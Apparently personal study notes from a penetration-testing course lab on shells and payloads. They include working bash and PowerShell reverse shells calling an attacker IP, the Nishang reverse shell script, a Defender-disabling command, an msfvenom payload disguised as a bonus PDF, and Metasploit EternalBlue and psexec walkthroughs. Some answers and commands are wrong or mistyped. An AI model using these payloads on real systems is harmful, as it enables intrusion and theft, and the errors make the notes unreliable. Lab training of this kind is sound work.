Shell Jack Us In, Payloads Deliver Us shells
./followthegreencube.sh
-Shell is a program that provides a comp user with an interface to input instruction int the sys and view text out put (Bash, Zsh, cmd, and Powershell,..)
-a shell is often the result of exploiting a vul or bypassing security measures to gain interactive access to a host. we may have heard or read the following phrase used by people discusing an engagement or a recent practice sessiong
-remote shell = success pentest this is outcome after enumeration and identification of promissing exploits
\\Why Get a Shell?
-the shell gives us direct access to the OS, system commands, and file system, if we gain access we can start enum the system for vectors that may allow us to escalate privileges, pivot, transfer files, ....
-establishing a shell also allows us to maintain persistence on the sys, give us more time to work, it can make it easier to use our atk tools exfiltrate data, gather, store and doc all the details of our atk.
-shell is more invisible than VNC, RDP harder to detect than graphical shells, faster to navigate the OS, and easier to automate our actions
Perspective	Description
Computing	The text-based userland environment that is utilized to administer tasks and submit instructions on a PC. Think Bash, Zsh, cmd, and PowerShell.
Exploitation & Security	A shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host. An example would be triggering EternalBlue on a Windows host to gain access to the cmd-prompt on a host remotely.
Web	This is a bit different. A web shell is much like a standard shell, except it exploits a vulnerability (often the ability to upload a file or script) that provides the attacker with a way to issue instructions, read and access files, and potentially perform destructive actions to the underlying host. Control of the web shell is often done by calling the script within a browser window.
\\Payloads Deliver us Shells.

Within the IT industry as a whole, a payload can be defined in a few different ways:

Networking: The encapsulated data portion of a packet traversing modern computer networks.
Basic Computing: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.
Programming: The data portion referenced or carried by the programming language instruction.
Exploitation & Security: A payload is code crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.
\\CAT5 Security Engagement Preparation
-pentester working for CAT5 Security, and we are preparing to perform an engagement for our client inlanefreigh. the more senior team members at CAT5 want to see our skill with shell & payloads before inlcuding us in the live engagement
\\Shell UseBasicParsing
-replicate being able to get a bind and reverse shell
-Bind Shell on Linux host
-Reverse Shell on Windows Host
\\Payload UseBasicParsing
-Demo lauching a payload from MSF 
-Demo searching and building a payload from PoC on ExploitDB
-Demo Knowledge of payload creation,
\\Getting a Shell on Windows
-Using the recon results provided, craft or use a payload that will exploit the host and provide a shell background
\\Getting a shell on Linux
-Using the recon results provided, craft or use a payload to exploit the host and eastablish a shell session
\\Landing a Web Shell
-Demo knowledge of web shells and common web app by identifyin a common web app and its corressponding language
-using a recon reslt , deloy a pyload that provide shell access from browser
\\Spotting a Shell or Payload 
$env $ps
\\===========================
Bind Shells
target sys has a listenter and awaits a connection
\\Practicing with GNU Netcat
\\1 Server - Target starting Netcat listener
$nc -lvnp 7777  -> waiting for client to connect
\\2 client - connect to target
$nc -nv 10.129.41.200 7777
\\3 Server - Target receiving connection from client
$nc -lvnp 7777
that is not proper shell. it just a Netcat TCP session established.
\\4 Client- Attack box sending message hello academy
$nc -nv 10.129.41.200 7777
\\5 Server - Target receiving Hello Academy message
$nc -lvnp 7777
NOTE: when on the academy network (10.129.x.x/16) we can work with another academy student to conn to their target box and pratice the concepts presentad in this module
\\Establishing a Basic Bind Shell with Netcat
Netcat not actual shell it only TCP session, only able to pass text within the pipe setup by netcat. let use Netcat to serve up our shell to establish a real bind shell
-on svr site we will need to specify the dir, shell, listener, work with some pipelines, and input & output redirectin. to ensure a shell to sys get served when the client attemps to conn
\\1. Server- Binding a Bash shell to the TCP session
$rm -f /tmp/f; mkfifo /tmp/f; cat/tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f 
this diff depend on OS
\\2 Client - conn to bind shell on target
$nc -nv 10.129.41.200 7777
\\======================================
Reverse Shells
-the atk box will have a listener running and target will need to initiate the conn
exploit some vuls like unrestricted file upload, command injection,etc,..) to force the target to initiate a conn with our target box, effectively meaning our atk box becomes the server and the target becomes the client
-utilize payload reverse at: 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-incase admin known the pyaload and implement defend let customize the payload
\\Hands-on With A Simple Reverse Shell in Windows
(Server Attack box) $sudo nc -lvnp 443
-firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port.
- try to utilize the living off the land on target sstem to gain access to
\\What applications and shell languages are hosted on the target?
\\Client (target)
PS> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-incase AV blocking try to run as admin
\\Disable AV
$Set-MpPreference -DisableRealtimeMonitoring $true   -> once AV is disabled attempt to execute the code again
\\Server (attack box)
$sudo nc -lvnp  443
10.129.20.51 htb-student HTB_@cademy_stdnt!
<test>When establishing a reverse shell session with a target, will the target act as a client or server?
client
<test>Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.

$$xfreerdp /v:<ip> /u:htb-student /p:<password>
10.10.15.40
\\\\\\\\\\\\\\\\\===========================================
Introduction to Payloads
\\have you ever sent an email or text to someone?
-in information security the payload is the command and/or code that exploit the vul in an OS and/or application.
-the payload is the command and/or code that performs the malicious action from a defensive per,
-when deliver and execute payloads, just like any other program, we give the target comp instructions on what it need to do. 
-the terms "malware" and " malicious code" romanticzie the process and make it more mysterious than it is/
\\One-Liners Examined
\\Netcat/Bash Reverse Shell One-liner
$rm -f /tmp/f; mkinfo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f 
common one-liner issued on a linux system to serve a Bash shell on a network socket utilizing a Netcat listener.
\\Remove /tmp/F
rm -f /tmp/f;
removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequently
\\MAke A Named Pipe
$mkfifo /tmp/f 
-Make a https://man7.org/linux/man-pages/man7/fifo.7.html at the location specified, /tmp/f is the FIFO named pipe file, the semi-colon(;) is used to execute the command sequently
\\Output redirection
$cat /tmp/f |
-Concatenates the FIFO named pipe file /tmp/f, the pipe (|) conn the standard output of cat /tmp/f to te standard input of the commnd that comes after the pipe (|)
\\Set Shell options
$/bin/bash -i 2>&1 | 
Specifies the cmd language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2)& standard output data stream (1) are redirected to the cmd following the pipe ([])
\\Open a Connection with Netcat
$nc 10.10.14.12 7777 > /tmp/f 
-Uses Netcat to send a conn to atk host port, the output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner cmd is executed
\\PowerShell One-Liner Explained

$powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
\\Calling PowerShell
PS> powershell -nop -c 
-execute Ps with no profile (nop) and executes the cmd/script block (-c) contained in the quotes.this particular cmd is issued inside of command-prompt, 
\\Binding A socket
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
-Set/eval the variable $client equal to (=) the Net-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will conn with the TCP socket listed in the parentheses (10.10.14.158,443) the semi-colon(;) ensure the cmd & code are executed sequently
\\Setting the command stream
$stream = $client.GetStream();
Set/evaluates the var $stream equal to (=) $client var and the .NET fram method called Get Stream that faciliate network comm, the semi-colon(;) ensures the cmd & code are executed sequentially
\\Empty Byte Stream
[byte[]]$byte = 0..65535|%{0};
-Create a byte type array([]) called $bytes that returns 65,535 zeros as the values in the array. this is essentially an empty byte stream that will be directed to the TCP listener on an atk box await for conn
\\Stream Parameters
$while(($i = $stream.Read($byte, 0, $bytes.Length)) -ne 0)
-Start a while loop containing the $i var set equal to (=) the .Net fram Stream.Read($stream.Read) method
the parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parenthesses of the method
\\Set The Bytes encoding
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)};
set/eva the var $data (=) an ASCII encoding .NET frame class that will be used in conjunc GetString method to encode the byte stream ($bytes) into ASCII
\\Invoke-Expression
$sendback = (iex $data 2>&1 | Out-String );
-Set/eva the var $senback (=) invoke-expression (iex) cmdlet the $data var, 
then redirects the standard error (2>)& standard output through a pipe (|) to the Out-String cmdlet which coverts input object into strings
\\Show Working directory
$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';
-Set/eva the var $sendback2 (=) the $sendback var (+) the string PS('PS') + path to the working dir ((pwd).path) + the string '> ' 
>> this will result in the shell prompt being PS C:\workingdirectoryofmachine >.
\\Sets sendbyte
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
$sendbyte = ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat Listener 
\\Tarminate TCP connection
$client.Close()"      >> TCP close method will be used when the conn is terminated
Script/ps1
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
\\Automating Payloads & Delivery with Metasploit
-framework dev by Rapid 7 that stream line the process of exploiting vul through the use of prebuild module
-understand what we are doing or it will ruin all the process.
\\Praticing with Metasploit
$sudo msfconsole
\\NMAP scan
$nmap -sC -sV -Pn 10.129.164.25
>> it will show some vul that can be exploit using MSF
\\Searching Within Metasploit
msf>search smb
56 exploit/windows/smb/psexec  = no + exploit module in MSF + target platform + service + define the tool that will get uploaded to the target system if it is vul
$msf>use 56   >> msf6 exploit(Windows/smb/psexec)>
\\Examining an Exploit options
$msf> options
-notice how this particular exploit will use a reverse TCP shell conn utilizing Meterpreter. A meterpreter shell give us far more func than a raw TCP reverse shell,
\\Setting options
$msf>set RHOSTS 10.129.180.71
$msf>set SHARE ADMIN$
$msf>set SMBPass HTB_@cademy_stdnt!
$msf>set SMBUser htb-student
$msf>set LHOST 10.10.14.222
-these settings will ensure that our payload is delivered to the proper target (RHOSTS), uploaded to the default administrative share (ADMIN$)
utilizing cred (SMBPass & SMBUser) then initiate a reverse shell conn with our local host machine (LHOST)
-these settings will be specific to the IP addr on atk box. aws with ced. we can set the LHOST (local host) VPN tunnel IP addr or the VPN tunnel interface Ideals
\\Explits Away  
$msf> exploit
-sign of sucessful when the session established a Meterpreter shell session (meterpreter >) and system-level shell session
-Meterpreter is a payload that uses in-memory DLL injetion to steathfully establish a comm channel betw an atk box and target
-the proper cred and atk vector can give ability upload & download files, exe cmd, run keylogger, create/start/stop services, manage processes ,...
https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/
\\Interactive Shell
meterpreter>shell
10.129.201.160 
<test> Exploit the target using what you've learned in this section, then submit the name of the file
 located in htb-student's Documents folder. (Format: filename.extension)
$nmap -sV -sC -Pn --top-ports 100 <ip>
<r> smb2 OS 10 pro 18363 >> set RHOSTS ,...
$ls C:/Users/htb-student/Documents/
\\\\\\\\\\\\\\\\\=========================
Crafting Payloads with MSFvenom
-using automated atks in matasploit requires us to reach a vulnerable target machine over the network. 
run the exploit module, deliver the payload, and establish the shell session, we need comm with the system in the 1st (internal atk)
-in almost case we dont have reach internal network -> crafty in how the payload get delivered and executed on the sys. one such way may be to use MSFvenom to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file
-in addtion to providing a payload with flexible delivery options, MSFvenom also allows us to encrypt & encode payloads to bypass common anti-virus detection signatures.
\\Practicing with MSFvenom
$msfvenom -l payload to list all the available payload
\\Staged vs. Stageless Payloads
-staged create a way for us to send over more components of our atk. it like "setting the stage"  EX linux/x86/shell/reverse_tcp when run using an exploit module in msf. ths payload will send a small stage that will be exec on the target and then call back to the atk box to download the remainder of the payload over the network.
-> then execute the shellcode to establish a reverse shell. (stage take some memory which leave less space for the payload) what happen at each stage could vary depending on the payload
-stageless payload do not have a stage, take for ex linux/zarch/meterpreter_reverse_tcp
->run it in exploit MSF this will sent in its entirely across a network conn without a stage.this could benefit us in environments where we do not have access to much bandwidt and latency can interfere. staged payload could lead to unstable shell sessions.
->best to select a stageless payload. sometimes it be better for evasion purpose dueto less traffic passing over the network to exec the payload, especially if we deliver it by employing social engineering. 
-This conceptis also very well explained by Rapid 7 in this blog spothttps://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/
-there naming convension betw staged and stageless payload
\\Building A Stageless Payload
$msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
\\call MSFvenom
$msfvenom  >defines the tool used to make the payload
\\Creating a Payload
-p  > this option indicates that msfvenom is creating a payload
\\Choosing the Payload based on Architecture
$linux/x64/shell_reverse_tcp   > specifies a linux 64-bit stageless payload that will initiate a TCP-based reverse shell (shell_reverse_tcp)
\\Address to Connect Back to
LHOST=10.10.14.113 LPORT=443
when exec the payload will call back to the specified IP addr 10.10.14.113 on the specified port (443)
\\Format To Generate Payload In
-f elf    > the flag -f specifies the format the generated binary will be in. 
\\Output  >  createbackup.elf
\\Executing a Stageless Payload
- email message with the file attached
-Download link on a web
-combined with a metasploit exploit module (require internal network)
-via flash drive as part of an onsite pentest
-> we would have a listener ready to catch the conn on the atk box side upon successful exec
\\NC Connection
$sudo nc -lvnp 443       > when the file is exec we will caught a Shell\
\\Connection established
\\Building a simple Stageless Payload for a Windows system
$msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
same command Syntax
\\Executing a Simple Stageless Payload on a Windows System
without masking the file sooon wwill be detected by AV 
\\\\\\\\\\\\====================================================
Infiltrating Windows
atk surface grows daily:https://www.cvedetails.com/vendor/26/Microsoft.html
\\Prominent Windows exploits
MS08-067 , Eternal Blue, PrintNightmare, BlueKeep, Sigred, SeriousSam, Zerologon
\\Enumerating Windows & Fingerprinting AuthenticationMethods
-try to read Time to live (ttl) counter when utilizing ICMP to determine if the host is up 
-window ttl will either be 32 or 128 this can be pretty reliable but not gurantee
\\Pinged Host
$ping 192.168.86.39
$nmap -O -v to OS identify  or -A and -Pn 
$sudo nmap -v -O 192.168.86.39
\\Banner Grab to Enumerate ports
$sudo nmap -v 192.168.86.39 --script banner.nse
\\Bats, DLLs, & MSI Files, Oh My!
+DLLs +Batch +VBS +MSI +Powershell  watch out fo Tool tactics and procedures for building our payloads and delivering them onyo the host to land a shell
\\Tools, Tactics, and Procedures for Payload generation, Transfer, and Execution
\\Payload generation
+MSFVenom & Metaspoit-Framwork   https://github.com/rapid7/metasploit-framework
+Payload All The Thing   https://github.com/swisskyrepo/PayloadsAllTheThings
+Mythic C2 Framework    https://github.com/its-a-feature/Mythic
+Nishang    https://github.com/samratashok/nishang
+Darkarmour   https://github.com/bats3c/darkarmour
\\Payload Transfer and Execution:
besite vector web-drive-by, phishing email or dead drip, window have several other avenues of payload deliveryy.
+impacket https://github.com/fortra/impacket provides way to interract with network protocols directly, impacket deal with psexec, smbclient, wmi, kerberos, and ability to stand up an SMB server
+payload all the things  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md
find quick oneliner to help transfer file across hosts expediently
+SMB: useful when host joined and utilize share to host data, we can use these smb share along with C$ and admin$ to host and transfer our payload and even exfiltrate data over the links
+Remote execution via MSF: built into many of the exploit module in metasploit is a func that will build, stage, and execute the payload auto
+ Other protocols: FTP, TFTP, HTTP/S -> enum and pay attention to the func that are open and avai for user
\\EX Compromise Walkthrough
\\Enum the host
$nmap -v -A 10.129.201.97
analyze result and refer to smt like MS17-010(eternalblue), IIS service, and SMB 
-> validate it with MSF auxiliary/scanner/smb/smb_ms17_010
2. search for and decide on an exploit path
$msfconsole > search eternalblue.
$use auxiliary/scanner/smb/smb_ms17_010  > show options > set RHOST 10.129.201.97 > run
<r> found out target vul with eternalblue let setup the exploit and payload
3. select exploit & payload then deliver
\\Choose & configure Our exploit & payload
msf> search eternalblue
\\configure the Exploit & Payload
msf>use 2 > options ensuer RHOSTS, LHOST, and LPORT field required
-kept it simple and just used a windows/meterpreter/reverse_tcp payload. use this for diff shell type or obfuscate atk more/
4. Execute Attack, and Receive A CAllback
\\Execute Our Attack
msf>exploit   meterpreter>getuid
sucess -> utilize meterpreter shell to run further commands
5. Identify the Native Shell
\\Identify Our Shell 
meterpreter > shell 
\\CMD-Prompt and Power[Shell]s for fun and profit
CMD deals with text input and output and doean't keep record command used, not effect by Execution Policy , and User Account Control (UAC)
PowerShell utilize .NET object for all input and out put.
Use CMD when:

You are on an older host that may not include PowerShell.
When you only require simple interactions/access to the host.
When you plan to use simple batch files, net commands, or MS-DOS native tools.
When you believe that execution policies may affect your ability to run scripts or other actions on the host.
Use PowerShell when:

You are planning to utilize cmdlets or other custom-built scripts.
When you wish to interact with .NET objects instead of text output.
When being stealthy is of lesser concern.
If you are planning to interact with cloud-based services and hosts.
If your scripts set and use Aliases.
\\WSL and Powershell for Linux
there malwares tha utilize Python3 and Linux bin to download install payload lib that are native to both window and linux WSL
- any network request or functions executed to or from WSL instance are not parsed by Windows Firewall and Window Defender, making it a bit of a blind spot on the host
-same issues found via PowerShell Core which can be installed on Linux operating system 
hacker aim to use these features to avoid AV and EDR detection mechanism
10.129.9.139 
<test> What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')
-> .batch
<test> What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)
-> search google    
<test>  Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\
$sudo nmap -A -v <IP>
<result>

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
$msfconsole -q > use exploit/windows/smb/smb_ms17_010/psexec
>set RHOST <targetip> set LHOST <atk IP> exploit > cat <filename>
\\\\\\\============================================
Infiltrating Unix/Linux
\\Common considerations 
benefit from considering the 
 What distribution of Linux is the system running?
What shell & programming languages exist on the system?
What function is the system serving for the network environment it is on?
What application is the system hosting?
Are there any known vulnerabilities?
\\Ganining a Shell Through Attacking a Vulnerable application
$nmap -sC -sV 10.129.201.101
> let get gaining a shell session 
get some infor like listening on ports 80, 443, 3306 (MySQl, 21 (Ftp)) it may be safe to assume that this is a web svr hosting a web app.
some version web stack apache 2.4.6 and PHP 7.2.34 and distribution of linux running on the sys (CentOS) 
> let check the IP on web browser due to it show a web stack there
rConfig management tools from the IP > a app used by network & system admin to automate the process of configurating network app.
ex it use case would remotely configure network interface with IP addressing infr on mutiple router simul 
=> once it atked all network infra will ruins
\\Discovering a Vulnerability in rConfig
> looking for its verrsion > rConfig (3.9.6) > use this infor start looking for any CVEs, Publicly available exploits and proof of concepts(PoCs)
ex: exploit DB, rapid 7
\\Search for an Exploit Module 
$msf> search rConfig
NOTE: use some search on Rapid 7 or git hub like rConfig 3.9.6 exploit metasploit github
> search result rconfig_vendors_auth_file_upload_rce.rb > this can get us a shell on linux runing rconfig_vendors_auth_file_upload_rce but no module on MSF search
we can copy the code from this repo onto our local atk box and save it in the dir that our local install of MSF is refer,
$locate exploits
/usr/share/metasploit-framwork/modules/exploits/linux/http <copy the code here>
\\keep the msf upload to Date 
$apt update; apt install metasploit-framwork or package manager
\\wget or copy local anway local need file extension .rb all module MSF are in ruby
\\Using the rConfig Exploit and Ganining a Shell
$msf> use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
>options and input the proper setting specific network infor and lauch exploit
We can see from the steps outlined in the exploitation process that this exploit:

Checks for the vulnerable version of rConfig
Authenticates with the rConfig web login
Uploads a PHP-based payload for a reverse shell connection
Deletes the payload
Leaves us with a Meterpreter shell session
\\Interact with the shell
meterpreter> shell <we can drop into system shell to gain access to the target system as if we were logged in and open a terminal
\\spawning a TTY Shell iwth PYthon 
the default shell may be refer as non-tty shell limited func and can often prevent use of essential cmd like su and sudo
> this because the payload was executed on the target by the apache user.
>we can manually spawn a TTY shell using python if it presentad
\\Interactive Python3
$python -c 'import pty; pty.spawn("/bin/sh")'
Whoami
this command use python to import the pty module then uses the pty.spawn function to execute the bourne shell binary(/bin/sh) we now have a prompt (sh-4.2$) and access to more sys command to move about the system as we please
